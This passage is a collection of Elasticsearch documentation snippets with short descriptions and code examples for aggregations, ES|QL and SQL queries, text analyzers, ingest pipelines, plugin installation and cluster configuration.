}\n}\n```\n\n----------------------------------------\n\nTITLE: Date Range Aggregation Response in Elasticsearch\nDESCRIPTION: Shows the response for a date range aggregation with bucket counts and formatted date strings. The response includes two buckets with their respective document counts and formatted date ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-daterange-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"range\": {\n      \"buckets\": [\n        {\n          \"to\": 1.4436576E12,\n          \"to_as_string\": \"10-2015\",\n          \"doc_count\": 7,\n          \"key\": \"*-10-2015\"\n        },\n        {\n          \"from\": 1.4436576E12,\n          \"from_as_string\": \"10-2015\",\n          \"doc_count\": 0,\n          \"key\": \"10-2015-*\"\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Right Characters from Strings using ESQL RIGHT Function\nDESCRIPTION: Demonstrates how to use the RIGHT function in ESQL to extract a specified number of characters from the right side of a string. This example keeps only the last_name field from the employees index and creates a new column 'right' containing the last 3 characters of each last name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/right.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL right = RIGHT(last_name, 3)\n```\n\n----------------------------------------\n\nTITLE: Custom Background Context for Significant Terms in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use a background filter to narrow the context for significant terms. It focuses on terms specific to Madrid within documents mentioning Spain.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"city\": \"madrid\"\n    }\n  },\n  \"aggs\": {\n    \"tags\": {\n      \"significant_terms\": {\n        \"field\": \"tag\",\n        \"background_filter\": {\n          \"term\": { \"text\": \"spain\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Enriched Geohex Document with Ingest Pipeline in Elasticsearch\nDESCRIPTION: Indexes a document with a geohex (H3) value using the enriched 'geohex2shape' pipeline, adding additional fields like parent, children, and non-children tiles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT geocells/_doc/1?pipeline=geohex2shape\n{\n  \"geocell\": \"811fbffffffffff\"\n}\n\nGET geocells/_doc/1\n```\n\n----------------------------------------\n\nTITLE: Creating Index for DFS Profiling in Elasticsearch (Console)\nDESCRIPTION: Sets up an index with multiple shards and indexes documents with different values on a keyword field for demonstrating DFS profiling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPUT my-dfs-index\n{\n  \"settings\": {\n    \"number_of_shards\": 2,\n    \"number_of_replicas\": 1\n  },\n  \"mappings\": {\n      \"properties\": {\n        \"my-keyword\": { \"type\": \"keyword\" }\n      }\n    }\n}\n\nPOST my-dfs-index/_bulk?refresh=true\n{ \"index\" : { \"_id\" : \"1\" } }\n{ \"my-keyword\" : \"a\" }\n{ \"index\" : { \"_id\" : \"2\" } }\n{ \"my-keyword\" : \"b\" }\n```\n\n----------------------------------------\n\nTITLE: Creating a Document with Sequence Number in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a new document in Elasticsearch, which will assign an initial sequence number and primary term. The response includes these values along with other metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/optimistic-concurrency-control.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT products/_doc/1567\n{\n  \"product\" : \"r2d2\",\n  \"details\" : \"A resourceful astromech droid\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_shards\": {\n    \"total\": 2,\n    \"failed\": 0,\n    \"successful\": 1\n  },\n  \"_index\": \"products\",\n  \"_id\": \"1567\",\n  \"_version\": 1,\n  \"_seq_no\": 362,\n  \"_primary_term\": 2,\n  \"result\": \"created\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with Flatten Graph Filter in Elasticsearch\nDESCRIPTION: This example shows how to create a custom analyzer that uses the word_delimiter_graph filter to produce token graphs with catenated, multi-position tokens, and then flattens them using the flatten_graph filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-flatten-graph-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_custom_index_analyzer\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"my_custom_word_delimiter_graph_filter\",\n            \"flatten_graph\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"my_custom_word_delimiter_graph_filter\": {\n          \"type\": \"word_delimiter_graph\",\n          \"catenate_all\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using DATE_TRUNC with Time Spans in ESQL\nDESCRIPTION: Demonstrates truncating dates to year boundaries using the DATE_TRUNC function with time spans.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-time-spans.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, hire_date\n| EVAL year_hired = DATE_TRUNC(1 year, hire_date)\n```\n\n----------------------------------------\n\nTITLE: Basic Set Processor Configuration\nDESCRIPTION: Simple example showing how to set a field value to a static number using the Set processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/set-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"description\" : \"sets the value of count to 1\",\n  \"set\": {\n    \"field\": \"count\",\n    \"value\": 1\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Frozen Indices with Elasticsearch SQL using SHOW TABLES\nDESCRIPTION: Example of using the INCLUDE FROZEN keyword with SHOW TABLES command to display both regular and frozen indices in the results. The output shows tables of different types including a frozen index named 'archive'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-frozen.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES INCLUDE FROZEN;\n\n catalog       |     name      | type     |     kind\n---------------+---------------+----------+---------------\njavaRestTest      |archive        |TABLE     |FROZEN INDEX\njavaRestTest      |emp            |TABLE     |INDEX\njavaRestTest      |employees      |VIEW      |ALIAS\njavaRestTest      |library        |TABLE     |INDEX\n```\n\n----------------------------------------\n\nTITLE: Example Response for Percentiles Bucket Aggregation\nDESCRIPTION: Illustrates the response format for a percentiles_bucket aggregation query. It includes the aggregation results showing the calculated percentiles for monthly sales.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-percentiles-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               }\n            }\n         ]\n      },\n      \"percentiles_monthly_sales\": {\n        \"values\" : {\n            \"25.0\": 375.0,\n            \"50.0\": 375.0,\n            \"75.0\": 550.0\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL FROM Query with Escaped Index Names\nDESCRIPTION: Demonstrates how to use double quotes to escape index names containing special characters in the FROM command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_6\n\nLANGUAGE: esql\nCODE:\n```\nFROM \"this=that\", \"\"\"this[that\"\"\"\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameters Documentation\nDESCRIPTION: Parameter documentation for an ESQL function that evaluates conditions and returns values based on the evaluation results. The function takes a condition, a true value to return when the condition is met, and an else value for when no conditions are true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/case.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`condition`\n:   A condition.\n\n`trueValue`\n:   The value that's returned when the corresponding condition is the first to evaluate to `true`. The default value is returned when no condition matches.\n\n`elseValue`\n:   The value that's returned when no condition evaluates to `true`.\n```\n\n----------------------------------------\n\nTITLE: Heap Size Configuration\nDESCRIPTION: Configuration example for setting both minimum and maximum heap size to 2GB using a JVM options file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/jvm-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n-Xms2g\n-Xmx2g\n```\n\n----------------------------------------\n\nTITLE: Internal Representation of Nested Objects in Elasticsearch\nDESCRIPTION: Shows how Elasticsearch internally flattens nested objects into a simple list of key-value pairs using dot notation to represent the hierarchy. Field names combine parent and child names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/object.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"region\":             \"US\",\n  \"manager.age\":        30,\n  \"manager.name.first\": \"John\",\n  \"manager.name.last\":  \"Smith\"\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Azure Classic Discovery Plugin in Elasticsearch\nDESCRIPTION: Command to install the Azure Classic Discovery plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install discovery-azure-classic\n```\n\n----------------------------------------\n\nTITLE: Installing Korean (nori) Analysis Plugin in Elasticsearch\nDESCRIPTION: Command to install the Korean (nori) analysis plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-nori\n```\n\n----------------------------------------\n\nTITLE: Configuring Time Series Index Mode in Elasticsearch\nDESCRIPTION: Setting to specify the mode of an index, supporting time_series or null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.mode: time_series\n```\n\n----------------------------------------\n\nTITLE: Query Rescoring in Elasticsearch\nDESCRIPTION: Shows how to rescore search results using a secondary query with custom weights and window size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/filter-search-results.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n   \"query\" : {\n      \"match\" : {\n         \"message\" : {\n            \"operator\" : \"or\",\n            \"query\" : \"the quick brown\"\n         }\n      }\n   },\n   \"rescore\" : {\n      \"window_size\" : 50,\n      \"query\" : {\n         \"rescore_query\" : {\n            \"match_phrase\" : {\n               \"message\" : {\n                  \"query\" : \"the quick brown\",\n                  \"slop\" : 2\n               }\n            }\n         },\n         \"query_weight\" : 0.7,\n         \"rescore_query_weight\" : 1.2\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Mapping Character Filter\nDESCRIPTION: This example shows how to create a custom analyzer with a custom mapping character filter using the create index API. The filter is configured to replace emoticons with text equivalents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-mapping-charfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"char_filter\": [\n            \"my_mappings_char_filter\"\n          ]\n        }\n      },\n      \"char_filter\": {\n        \"my_mappings_char_filter\": {\n          \"type\": \"mapping\",\n          \"mappings\": [\n            \":) => _happy_\",\n            \":( => _sad_\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Unique DNS Queries per Registered Domain with ESQL\nDESCRIPTION: This query processes DNS logs to find high numbers of unique DNS queries per registered domain. It uses GROK pattern matching to extract the registered domain, counts distinct queries, and filters for results with more than 10 unique queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-examples.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM logs-*\n| GROK dns.question.name \"%{DATA}\\\\.%{GREEDYDATA:dns.question.registered_domain:string}\"\n| STATS unique_queries = COUNT_DISTINCT(dns.question.name) BY dns.question.registered_domain, process.name\n| WHERE unique_queries > 10\n| SORT unique_queries DESC\n| RENAME unique_queries AS `Unique Queries`, dns.question.registered_domain AS `Registered Domain`, process.name AS `Process`\n```\n\n----------------------------------------\n\nTITLE: Configuring Set Priority Action in Elasticsearch ILM Policy\nDESCRIPTION: This snippet demonstrates how to create an ILM policy that sets the priority of an index to 50 when it enters the warm phase. The 'set_priority' action is used within the policy definition to specify the priority value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-set-priority.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"set_priority\" : {\n            \"priority\": 50\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Date Parts in Elasticsearch SQL\nDESCRIPTION: This SQL snippet demonstrates various ways to extract different parts of a date using the DATE_PART function in Elasticsearch SQL. It covers extracting year, quarter, month, day, hour, minute, second, and millisecond from date values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/date_extract.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_PART('year', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS y,\n    DATE_PART('quarter', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS q,\n    DATE_PART('month', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS mo,\n    DATE_PART('day', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS d,\n    DATE_PART('hour', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS h,\n    DATE_PART('minute', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS mi,\n    DATE_PART('second', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS s,\n    DATE_PART('millisecond', CAST('2019-09-14T17:45:21.654321Z' AS DATETIME)) AS ms;\n```\n\n----------------------------------------\n\nTITLE: Using Optional Fields in EQL Queries\nDESCRIPTION: Shows how to use the '?' operator to mark fields as optional in EQL queries. This is useful when you're not sure if a field exists in the dataset you're searching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_8\n\nLANGUAGE: eql\nCODE:\n```\nnetwork where ?user.id != null\n```\n\n----------------------------------------\n\nTITLE: Random Score Function with Lucene ID\nDESCRIPTION: This snippet demonstrates using the `randomScore` function without specifying a field. This uses the internal Lucene document ids as a source of randomness, which is efficient but not reproducible.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"randomScore(100)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Delimited Payload Filter\nDESCRIPTION: Creates an index with a custom delimited payload filter using '+' as delimiter and integer encoding for payloads.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-delimited-payload-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT delimited_payload_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_plus_delimited\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"plus_delimited\" ]\n        }\n      },\n      \"filter\": {\n        \"plus_delimited\": {\n          \"type\": \"delimited_payload\",\n          \"delimiter\": \"+\",\n          \"encoding\": \"int\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Inserting Histogram Data in Elasticsearch\nDESCRIPTION: These snippets insert two documents with histogram data into the metrics index, representing latency metrics for different networks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-sum-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index/_doc/1?refresh\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2?refresh\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" :  [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [8, 17, 8, 7, 6]\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using Katakana Uppercase Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure an index with a custom analyzer that uses the katakana_uppercase token filter, and then shows how to test the analyzer with Japanese katakana text. The example converts small katakana characters to their standard uppercase versions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-katakana-uppercase.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"katakana_uppercase\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"ストップウォッチ\"\n}\n```\n\n----------------------------------------\n\nTITLE: Analyze API request using the stop filter\nDESCRIPTION: This snippet demonstrates how to use the `stop` filter with the analyze API to remove stop words (a, the) from the input text 'a quick fox jumps over the lazy dog'. It specifies the 'standard' tokenizer and the 'stop' filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [ \"stop\" ],\n  \"text\": \"a quick fox jumps over the lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL FROM Query with Multiple Indices\nDESCRIPTION: Illustrates querying multiple indices using comma-separated lists and wildcards in the FROM command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees-00001,other-employees-*\n```\n\n----------------------------------------\n\nTITLE: Missing Values Handling in Elasticsearch Sort\nDESCRIPTION: Example showing how to handle missing values in sort operations using the missing parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\" : [\n    { \"price\" : {\"missing\" : \"_last\"} }\n  ],\n  \"query\" : {\n    \"term\" : { \"product\" : \"chocolate\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Field Boosting with Tie Breaker in query_string\nDESCRIPTION: Example of boosting specific fields during a query_string search across multiple fields. The name field is boosted by a factor of 5 using the ^5 notation, and a tie_breaker of 0 is specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\" : {\n      \"fields\" : [\"content\", \"name^5\"],\n      \"query\" : \"this AND that OR thus\",\n      \"tie_breaker\" : 0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multiple Reference Points Geo Sort in Elasticsearch\nDESCRIPTION: Demonstrates geo-distance sorting with multiple reference points for distance calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\": [\n    {\n      \"_geo_distance\": {\n        \"pin.location\": [ [ -70, 40 ], [ -71, 42 ] ],\n        \"order\": \"asc\",\n        \"unit\": \"km\"\n      }\n    }\n  ],\n  \"query\": {\n    \"term\": { \"user\": \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: High Precision Geohex Grid Query with Bounding Box\nDESCRIPTION: Demonstrates high precision (zoom level 12) geohex grid aggregation with geo_bounding_box filter to limit the search area and prevent excessive bucket generation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohexgrid-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"zoomed-in\": {\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"location\": {\n            \"top_left\": \"POINT (4.9 52.4)\",\n            \"bottom_right\": \"POINT (5.0 52.3)\"\n          }\n        }\n      },\n      \"aggregations\": {\n        \"zoom1\": {\n          \"geohex_grid\": {\n            \"field\": \"location\",\n            \"precision\": 12\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Create Operation\nDESCRIPTION: This JSON snippet represents an Elasticsearch create operation. It's used in bulk indexing to specify that a new document should be created.  It does not require any specific dependencies outside the Elasticsearch bulk API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/server/single-node/src/javaRestTest/resources/tsdb-bulk-request.txt#2025-04-21_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"create\": {}\n}\n```\n\n----------------------------------------\n\nTITLE: Using Top Hits in Pipeline Aggregations in Elasticsearch\nDESCRIPTION: This snippet shows how to use top_hits in pipeline aggregations, specifically with a bucket_selector for filtering. It demonstrates setting the size to 1 and specifying the path for the value to be passed to the wrapping aggregator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-hits-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"top_tags\": {\n      \"terms\": {\n        \"field\": \"type\",\n        \"size\": 3\n      },\n      \"aggs\": {\n        \"top_sales_hits\": {\n          \"top_hits\": {\n            \"sort\": [\n              {\n                \"date\": {\n                  \"order\": \"desc\"\n                }\n              }\n            ],\n            \"_source\": {\n              \"includes\": [ \"date\", \"price\" ]\n            },\n            \"size\": 1\n          }\n        },\n        \"having.top_salary\": {\n          \"bucket_selector\": {\n            \"buckets_path\": {\n              \"tp\": \"top_sales_hits[_source.price]\"\n            },\n            \"script\": \"params.tp < 180\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Minimum Document Count in Terms Aggregation\nDESCRIPTION: Example demonstrating how to set minimum document count threshold for terms inclusion in results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"tags\": {\n      \"terms\": {\n        \"field\": \"tags\",\n        \"min_doc_count\": 10\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Bucket Sort Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates the basic syntax for a bucket sort aggregation, including sort fields, order, and optional from and size parameters for truncation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-sort-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"bucket_sort\": {\n    \"sort\": [\n      { \"sort_field_1\": { \"order\": \"asc\" } },\n      { \"sort_field_2\": { \"order\": \"desc\" } },\n      \"sort_field_3\"\n    ],\n    \"from\": 1,\n    \"size\": 3\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Certificate Authority (CA) for Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a new Certificate Authority using the elasticsearch-certutil tool. It generates a CA key pair and extracts the public and private keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/run.ssl/readme.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nbin/elasticsearch-certutil ca -pem -days 7305\nunzip elastic-stack-ca.zip\nmv ca/ca.crt public-ca.pem\nmv ca/ca.key private-ca.key\n```\n\n----------------------------------------\n\nTITLE: Creating and Querying Date Fields in Elasticsearch\nDESCRIPTION: Example showing how to create an index with a date field and insert documents with different date formats (plain date, date with time, and milliseconds-since-epoch). The example also shows how to query and sort by the date field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"date\": {\n        \"type\": \"date\" <1>\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{ \"date\": \"2015-01-01\" } <2>\n\nPUT my-index-000001/_doc/2\n{ \"date\": \"2015-01-01T12:10:30Z\" } <3>\n\nPUT my-index-000001/_doc/3\n{ \"date\": 1420070400001 } <4>\n\nGET my-index-000001/_search\n{\n  \"sort\": { \"date\": \"asc\"} <5>\n}\n```\n\n----------------------------------------\n\nTITLE: Using VALUES Function in ESQL for Grouping and Sorting\nDESCRIPTION: This ESQL query demonstrates the use of the VALUES function to group first names by their first letter. It also showcases the use of SUBSTRING, MV_SORT, and SORT functions. The query returns sorted groups of first names for each starting letter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/values.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL first_letter = SUBSTRING(first_name, 0, 1)\n| STATS first_name = MV_SORT(VALUES(first_name)) BY first_letter\n| SORT first_letter\n```\n\n----------------------------------------\n\nTITLE: Setting Password Hashing Algorithm in Elasticsearch YAML\nDESCRIPTION: This YAML setting specifies the hashing algorithm used for secure user credential storage in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.authc.password_hashing.algorithm: bcrypt\n```\n\n----------------------------------------\n\nTITLE: Configuring Text Classification Options in Elasticsearch\nDESCRIPTION: Defines the configuration options for text classification in Elasticsearch's inference processor. It includes settings for classification labels, number of top classes, results field, and tokenization options for various model types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nclassification_labels: [string]\nnum_top_classes: integer\nresults_field: string\ntokenization:\n  bert:\n    span: integer\n    truncate: string\n  deberta_v2:\n    span: integer\n    truncate: string\n  roberta:\n    span: integer\n    truncate: string\n  mpnet:\n    truncate: string\n```\n\n----------------------------------------\n\nTITLE: GeoIP Pipeline Response with Country Database\nDESCRIPTION: Sample response showing the enriched document with country-level geographical information after processing with the GeoIP processor using the country database.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"my_id\",\n  \"_version\": 1,\n  \"_seq_no\": 65,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"ip\": \"89.160.20.128\",\n    \"geo\": {\n      \"continent_name\": \"Europe\",\n      \"country_name\": \"Sweden\",\n      \"country_iso_code\": \"SE\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Value Source with Runtime Field 